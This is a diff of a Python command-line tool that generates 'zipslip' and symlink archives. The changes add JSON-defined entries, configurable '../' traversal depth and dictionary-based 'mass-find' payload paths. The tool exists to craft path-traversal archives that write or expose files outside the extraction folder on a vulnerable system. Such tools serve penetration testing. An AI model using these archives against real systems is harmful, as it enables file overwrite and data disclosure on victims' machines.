@@ -25,7 +25,7 @@ import base64
 import binascii
 import os
 import shutil
-
+import json
 
 class Util:
 	RED = "\033[0;31m"
@@ -33,7 +33,7 @@ class Util:
 	YELLOW = "\033[1;33m"
 	END = "\033[0m"
 	
-	DICT_FILE = "path_traversal_dict.txt"
+	DICT_FILE = "dict.txt"
 	PAYLOAD_PATH_PLACEHOLDER = "{FILE}"
 
 	MULTIPLE_FILE_CONTENTS_SPLIT = "&&&&&&"
@@ -143,11 +143,11 @@ class Util:
 	def random_string(length=10):
 		return ''.join(random.choices(string.ascii_letters, k=length))
 	
-	def parse_input_list(paths):
-		return [p.lstrip(" ") for p in paths.split(",")]
-	
-	def parse_input_list_multiple_file_contents(multiple_file_contents):
-		return [p.lstrip(" ") for p in str(multiple_file_contents).split(Util.MULTIPLE_FILE_CONTENTS_SPLIT)]
+	def parse_input_list(paths, fc=None):
+		if fc:
+			return [(p.lstrip(" "),fc) for p in paths.split(",")]
+		else:
+			return [p.lstrip(" ") for p in paths.split(",")]
 		
 	def process_symlink_name(symlink, random_add=5, limitlen=10, extension=".symlink"):
 		# only keeps alphanumeric characters from the original file name
@@ -189,7 +189,6 @@ class Cloner:
     
     @staticmethod
     def clone_archive(source, archive_name):
-        """Efficiently clone an archive by copying and returning a writable handle"""
         try:
             archive_type = Cloner.get_archive_type(source)
             if not archive_type:
@@ -274,7 +273,7 @@ class SevenZipper:
 		
 		self.date_time = date_time
 		
-		# py7zr doesn't really use "fileinfo" kind of files
+		# py7zr doesn't use "fileinfo" files
 		return filename
 	
 	def add_file(self, file_info, content, symlink=False):
@@ -386,31 +385,29 @@ class Zipper:
 		show_default=True, 
 		callback=Util.update_compression,
 		help="Type of the archive.")
-		
-@click.option("-c", "--compression", 
-		type=click.Choice(Util.supported_compression, case_sensitive=False),
-		callback=Util.get_default_compression,
-		help="Compression algorithm to use in the archive.")
+
+@click.option("-c", "--clone",
+		help="Archive to clone. It creates a copy of an existing archive and opens to allow adding payloads.")
+
+@click.option("-j", "--json-file", 
+		help="JSON file containing a list of file definitions.")
 		
 @click.option("-p", "--paths", 
 		help="Comma separated paths to include in the archive.")
 		
 @click.option("-s", "--symlinks", 
-		help="Comma separated symlinks to include in the archive. To name a symlink use the syntax: path:name")
+		help="Comma separated symlinks to include in the archive. To name a symlink use the syntax: path;name")
 		
 @click.option("--file-content", 
-		help="Content of the files in the archive, file-content or multi-file-contents must be specified if paths are used.")
+		help="Content of the files in the archive, file-content must be specified if -p/--paths is used.")
 
-@click.option("--multiple-file-contents", 
-		help="Base64 encoded contents of the files in the archive separated by commas, the number of elements in multiple-file-contents must be equal to the number of paths. The options multi-file-contents or file-content must be specified if paths are used. This options overrides file-content option if both are specified.")
-		
 @click.option("--search", 
 		type=int,
 		is_flag=False, 
 		flag_value=5,
 		default=0,
 		show_default=True, 
-		help="If set, paths and symlink will generate multiple traversal paths to try and find the target file or path at different depths.")
+		help="Maximum depth in path traversal payloads, this option generates payload to traverse multiple depths. It applies to all symlinks and paths.")
 		
 @click.option("--dotdotslash", 
 		default="../", 
@@ -436,7 +433,12 @@ class Zipper:
 @click.option("--mass-find-placeholder", 
 		default=Util.PAYLOAD_PATH_PLACEHOLDER, 
 		show_default=True, 
-		help="Mass-find placeholder for filename in dictionary")
+		help="Filename placeholder in mass-find payload dictionary")
+	
+@click.option("--compression", 
+		type=click.Choice(Util.supported_compression, case_sensitive=False),
+		callback=Util.get_default_compression,
+		help="Compression algorithm to use in the archive.")
 		
 @click.option("--clone",
 		help="Archive to clone. It creates a copy of an existing archive and opens it in memory to allow adding payloads.")
@@ -446,9 +448,8 @@ class Zipper:
 		help="Verbosity trigger.")
 		
 @click.argument("archive-name")
-def main_procedure(archive_type, compression, paths, symlinks, file_content, multiple_file_contents,
-		archive_name, search, dotdotslash, mass_find, mass_find_mode, mass_find_dict,
-		mass_find_placeholder, clone, verbose):
+def main_procedure(archive_type, compression, paths, symlinks, file_content, json_file,
+		archive_name, search, dotdotslash, mass_find, mass_find_mode, mass_find_dict, mass_find_placeholder, clone, verbose):
 	"""
 	Script to generate "zipslip" and "zip symlink" archives.
 	
@@ -462,10 +463,9 @@ def main_procedure(archive_type, compression, paths, symlinks, file_content, mul
 	archiver = supported_archives.get(archive_type)
 
 	# At least one of paths, symlinks or mass_find need to be specified
-	# TODO: remove test
-	if not paths and not symlinks and not mass_find:
+	if not paths and not symlinks and not mass_find and not json_file:
 		print() # Adds a newline
-		raise click.ClickException("At least one of paths, symlinks or mass-find needs to be specified.")
+		raise click.ClickException("At least one of paths, symlinks, mass-find or json needs to be specified.")
 		exit(1)
 	
 	if not compression in Util.compression_lookup[archive_type]:
@@ -478,29 +478,8 @@ def main_procedure(archive_type, compression, paths, symlinks, file_content, mul
 			print() # Adds a newline
 			raise click.ClickException("file-content or multiple-file-contents are required when using paths")
 			exit(1)
-		
-		# File contents operations
-		if multiple_file_contents:
-			multiple_file_contents = Util.parse_input_list(multiple_file_contents)
-			tmp = []
-
-			#base64 decode
-			for mfc in multiple_file_contents:
-				try:
-					tmp.append(base64.b64decode(mfc))
-				#TODO: add specific exception here
-				except (binascii.Error, ValueError):
-					raise click.ClickException("invalid base64 string in multiple-file-contents.")
-					exit(1)
-
-			multiple_file_contents = tmp
-
-		paths = Util.parse_input_list(paths)
-		
-		if multiple_file_contents:
-			if not len(paths) == len(multiple_file_contents):
-				raise click.ClickException(f"the number of paths must match the number of file contents specified in multiple-file-contents. Length found {len(paths)=} {len(multiple_file_contents)=}")
-				exit(1)
+			
+		paths = Util.parse_input_list(paths, fc=file_content)
 	else:
 		# Default value (not supported by click)
 		paths = []
@@ -510,6 +489,43 @@ def main_procedure(archive_type, compression, paths, symlinks, file_content, mul
 	else:
 		# Default value (not supported by click)
 		symlinks = []
+
+	if json_file:
+		file_contents = []
+
+		with open(json_file, 'r') as f:
+			data = json.load(f)
+			if not isinstance(data, list):
+				print() # Adds a newline
+				raise click.ClickException(f"Error parsing json file: JSON file must containt a list of objects")
+				exit(1)
+
+			for entry in data:
+				if not isinstance(entry, dict):
+					print() # Adds a newline
+					raise click.ClickException(f"Error parsing json file: each item must be a JSON object, got {type(entry)}")
+					exit(1)
+
+				file = entry.get("file-name")
+				content = entry.get("content")
+				etype = entry.get("type")
+				tbase64 = entry.get("base64")
+				ext_content = None
+
+				if etype == "symlink":
+					symlinks.append(file)
+
+				elif etype == "path":
+					if tbase64:
+						try:
+							ext_content = base64.b64decode(content)
+							paths.append((file, ext_content))
+						except(binascii.Error, ValueError):
+							print(Util.YELLOW+f"[*] Invalid base64 string content for file \"{file}\", skipping."+Util.END)
+					else:
+						paths.append((file, content))
+				else:
+					print(Util.YELLOW+f"[*] Unknown file type \"{etype}\" for file {file}, skipping."+Util.END)
 
 	if mass_find:
 		# Overrides search mode
@@ -523,16 +539,16 @@ def main_procedure(archive_type, compression, paths, symlinks, file_content, mul
 				break
 
 			if mass_find_mode == "paths":
-				if not file_content and not multiple_file_contents:
+				if not file_content:
 					print() # Adds a newline
-					raise click.ClickException("file-content or multiple-file-contents are required when using paths")
+					raise click.ClickException("file-content are required when using paths")
 					exit(1)
 				else:
-					path = line.replace(mass_find_placeholder, mass_find)
-					paths.append(path)
+					path = line.replace(mass_find_placeholder, mass_find).rstrip()
+					paths.append((path, file_content))
 				
 			elif mass_find_mode == "symlinks":
-				symlink = line.replace(mass_find_placeholder, mass_find)
+				symlink = line.replace(mass_find_placeholder, mass_find).rstrip()
 				symlinks.append(symlink)
 	  
 		mass_find_dict.close()
@@ -560,6 +576,10 @@ def main_procedure(archive_type, compression, paths, symlinks, file_content, mul
 				else:
 					a.add_file(fi, s, symlink=True)
 			else:
+				# Strips symlink path and only keeps the name for payload generation.
+				if ";" in s:
+					_, s = s.split(";", 1)
+
 				if dotdotslash:
 					sp = Searcher.gen_search_paths(s, search, payload=dotdotslash)
 				else:
@@ -571,36 +591,25 @@ def main_procedure(archive_type, compression, paths, symlinks, file_content, mul
 					a.add_file(fi, ssp, symlink=True)
 							
 	if paths:
-		if multiple_file_contents or file_content:
+		for iterator in paths:
+			if isinstance(iterator, tuple):
+				fc = iterator[1]
+				f = iterator[0]
+			else:
+				f = iterator
 
-			# if multiple file contents are specified			
-			if multiple_file_contents:
-				iterator = tuple()	#the iterator is a tuple that will contain (path, file_content)
-				content_iter = zip(paths, multiple_file_contents)
-			elif file_content:
-				iterator = ""
-				content_iter = paths
-				fc = file_content
-
-			for iterator in content_iter:
-				if isinstance(iterator, tuple):
-					fc = iterator[1]
-					f = iterator[0]
+			if not search:
+				fi = a.create_fileinfo(f)
+				a.add_file(fi, fc)
+			else:
+				if dotdotslash:
+					fp = Searcher.gen_search_paths(f, search, payload=dotdotslash)
 				else:
-					f = iterator
-
-				if not search:
-					fi = a.create_fileinfo(f)
+					fp = Searcher.gen_search_paths(f, search)
+					
+				for ffp in fp:
+					fi = a.create_fileinfo(ffp)
 					a.add_file(fi, fc)
-				else:
-					if dotdotslash:
-						fp = Searcher.gen_search_paths(f, search, payload=dotdotslash)
-					else:
-						fp = Searcher.gen_search_paths(f, search)
-						
-					for ffp in fp:
-						fi = a.create_fileinfo(ffp)
-						a.add_file(fi, fc)
 				
 	if verbose:
 		Util.archive_info(a, archive_type, compression)
